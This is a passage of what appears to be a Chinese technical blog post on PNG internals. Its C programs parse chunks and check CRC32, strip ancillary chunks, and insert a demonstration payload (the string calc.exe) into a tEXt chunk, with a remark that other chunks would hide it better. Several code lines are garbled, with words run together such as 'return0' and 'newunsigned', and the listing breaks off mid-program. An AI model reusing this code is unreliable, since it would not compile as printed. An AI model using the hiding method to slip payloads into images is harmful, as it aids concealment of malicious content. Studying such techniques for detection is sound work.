class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;   </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            len=ftell(fp);</div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">            fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">            ChunkOffset=<span class="number">8</span>;</div><div class="line">            i=<span class="number">0</span>;</div><div class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                        i++;</div><div class="line">                        <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                        <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkLen: %10d              \n"</span>,ChunkLen);</div><div class="line">                        ChunkOffset+=ChunkLen+<span class="number">12</span>;</div><div class="line">                        crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);</div><div class="line">                        <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                        ChunkLen=ftell(fp);</div><div class="line">                        <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                        </div><div class="line">                                    <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">            &#125;</div><div class="line">            fclose(fp);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行如图，可获得完整的PNG文件结构:</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.58.01.png" alt="屏幕快照 2017-10-29 下午2.58.01.png"></p>
<p>注：这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
<h2 id="0x04-去除多余数据"><a href="#0x04-去除多余数据" class="headerlink" title="0x04-去除多余数据"></a>0x04-去除多余数据</h2><p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Editor去除辅助数据块gAMA、cHRM和bKGD</p>
<p>文件大小变化，但不影响PNG文件浏览</p>
<ol>
<li>程序实现</li>
</ol>
<p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
<p>保存为compress.cpp,完整代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(unsignedchar*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">           <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                       Crc= i;        </div><div class="line">                       <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                   <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                               Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                   <span class="keyword">else</span>       </div><div class="line">                                               Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                       &#125;        </div><div class="line">                       Crc32Table[i]= Crc;        </div><div class="line">           &#125;        </div><div class="line">           Crc=<span class="number">0xffffffff</span>;        </div><div class="line">           <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;         </div><div class="line">                       Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^InStr[m]];        </div><div class="line">           &#125;     </div><div class="line">           Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">           <span class="keyword">return</span> Crc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">           FILE *fp,*fpnew;   </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> Signature[<span class="number">8</span>]=&#123;<span class="number">0x89</span>,<span class="number">0x50</span>,<span class="number">0x4e</span>,<span class="number">0x47</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span>,<span class="number">0x0a</span>&#125;;         </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> IEND[<span class="number">12</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x44</span>,<span class="number">0xae</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x82</span>&#125;;        </div><div class="line">           <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\0.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                       return0;  </div><div class="line">           <span class="keyword">if</span>((fpnew=fopen(<span class="string">"c:\\test\\new.png"</span>,<span class="string">"wb"</span>))==<span class="literal">NULL</span>)</div><div class="line">                       return0;  </div><div class="line">           fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">           len=ftell(fp);</div><div class="line">           buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">           fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">           fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">           <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">           <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">           fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">           ChunkOffset=<span class="number">8</span>;</div><div class="line">           i=<span class="number">0</span>;</div><div class="line">           fwrite(Signature,<span class="number">8</span>,<span class="number">1</span>,fpnew);</div><div class="line">           <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">           &#123;</div><div class="line">                       i++;</div><div class="line">                       j=<span class="number">0</span>;</div><div class="line">                       <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                       fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                      fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                       ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                       fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                       <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                       &#123;           </div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                                   fwrite(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fpnew);</div><div class="line">                       &#125;</div><div class="line">                       <span class="keyword">else</span></div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                                   fseek(fpnew,<span class="number">-4</span>,SEEK_CUR);</div><div class="line">                                   j=<span class="number">1</span>;</div><div class="line">                       &#125;</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"  ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ChunkLen:%10d             \n"</span>,ChunkLen);</div><div class="line">                       crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                       fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                       ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32:%08X                    "</span>,ChunkCRC32);</div><div class="line">                       <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                       <span class="keyword">else</span></div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                                   <span class="keyword">if</span>(j==<span class="number">0</span>)</div><div class="line">                                               fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                       &#125;</div><div class="line">                       ChunkLen=ftell(fp);</div><div class="line">                       <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                       </div><div class="line">                                   <span class="keyword">break</span>;</div><div class="line">                       &#125;</div><div class="line">           &#125;</div><div class="line">           fwrite(IEND,<span class="number">12</span>,<span class="number">1</span>,fpnew);</div><div class="line">           fclose(fp);</div><div class="line">           fclose(fpnew);</div><div class="line">           return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="0x05-写入Payload"><a href="#0x05-写入Payload" class="headerlink" title="0x05-写入Payload"></a>0x05-写入Payload</h2><p>实例：按照辅助数据块的格式写入Payload</p>
<p>写入的Payload为:calc.exe</p>
<p>辅助数据块设置为：tEXt(文本信息数据块)</p>
<p>对应的完整数据块结构如下：</p>
<p>Length: 0000 00 08</p>
<p>Chunk Type Code： 74 45 58 74</p>
<p>Chunk Data：63 61 6c 63 2e 65 78 65</p>
<p>CRC：fa c4 08 76</p>
<p>写入的十六进制数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00 00 00 08 74 45 58 74 63 61 6c 63 2e 6578 65 fa c4 08 76</div></pre></td></tr></table></figure>
<p>注： 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Friend插入数据，如图</p>
<p>保存后，不影响PNG文件浏览</p>
<ol>
<li>程序实现</li>
</ol>
<p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
<p>保存为addpayload.cpp,完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                        Crc= i;        </div><div class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                    <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                                Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                    <span class="keyword">else</span>       </div><div class="line">                                                Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                        &#125;        </div><div class="line">                        Crc32Table[i]= Crc;        </div><div class="line">            &#125;        </div><div class="line">            Crc=<span class="number">0xffffffff</span>;        </div><div class="line">            <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line">            &#125;</div><div class="line">            Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">            returnCrc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">convertStrToUnChar</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">unsigned</span> <span class="keyword">char</span>* UnChar)</span>  </span></div><div class="line">&#123;  </div><div class="line">            inti = <span class="built_in">strlen</span>(str), j = <span class="number">0</span>, counter = <span class="number">0</span>;  </div><div class="line">            charc[<span class="number">2</span>];  </div><div class="line">            unsignedint bytes[<span class="number">2</span>];  </div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j += <span class="number">2</span>)   </div><div class="line">            &#123;  </div><div class="line">                        <span class="keyword">if</span>(<span class="number">0</span>== j % <span class="number">2</span>)  </div><div class="line">                        &#123;  </div><div class="line">                                    c[<span class="number">0</span>]= str[j];  </div><div class="line">                                    c[<span class="number">1</span>]= str[j + <span class="number">1</span>];  </div><div class="line">                                    <span class="built_in">sscanf</span>(c,<span class="string">"%02x"</span> , &amp;bytes[<span class="number">0</span>]);  </div><div class="line">                                    UnChar[counter]= bytes[<span class="number">0</span>];  </div><div class="line">                                    counter++;  </div><div class="line">                        &#125;  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">return</span>;  </div><div class="line">&#125;    </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddPayload</span><span class="params">(FILE *fp)</span></span></div><div class="line">&#123;</div><div class="line">            <span class="keyword">char</span>*Payload=<span class="string">"calc.exe"</span>;</div><div class="line">            unsignedchar *buf;</div><div class="line">            intlen;</div><div class="line">            intcrc32;</div><div class="line">            len=<span class="built_in">strlen</span>(Payload); </div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len+<span class="number">12</span>];</div><div class="line">            buf[<span class="number">0</span>]=len&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">1</span>]=len&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">2</span>]=len&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">3</span>]=len&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">4</span>]=<span class="string">'t'</span>;</div><div class="line">            buf[<span class="number">5</span>]=<span class="string">'E'</span>;</div><div class="line">            buf[<span class="number">6</span>]=<span class="string">'X'</span>;</div><div class="line">            buf[<span class="number">7</span>]=<span class="string">'t'</span>;</div><div class="line">            <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;len;j++)</div><div class="line">                        buf[j+<span class="number">8</span>]=Payload[j];</div><div class="line">            buf[len+<span class="number">8</span>]=<span class="number">0XFA</span>;</div><div class="line">            buf[len+<span class="number">9</span>]=<span class="number">0XC4</span>;</div><div class="line">            buf[len+<span class="number">10</span>]=<span class="number">0X08</span>;</div><div class="line">            buf[len+<span class="number">11</span>]=<span class="number">0X76</span>;</div><div class="line">            fwrite(buf,len+<span class="number">12</span>,<span class="number">1</span>,fp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE*fp,*fpnew;   </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> Signature[<span class="number">8</span>]=&#123;<span class="number">0x89</span>,<span class="number">0x50</span>,<span class="number">0x4e</span>,<span class="number">0x47</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span>,<span class="number">0x0a</span>&#125;;          </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> IEND[<span class="number">12</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x44</span>,<span class="number">0xae</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x82</span>&#125;;         </div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;  </div><div class="line">            <span class="keyword">if</span>((fpnew=fopen(<span class="string">"c:\\test\\new.png"</span>,<span class="string">"wb"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;  </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            len=ftell(fp);</div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">            fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">            ChunkOffset=<span class="number">8</span>;</div><div class="line">            i=<span class="number">0</span>;</div><div class="line">            fwrite(Signature,<span class="number">8</span>,<span class="number">1</span>,fpnew);</div><div class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                        i++;</div><div class="line">                        j=<span class="number">0</span>;</div><div class="line">                        <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                        ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                        <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                        &#123;           </div><div class="line">                   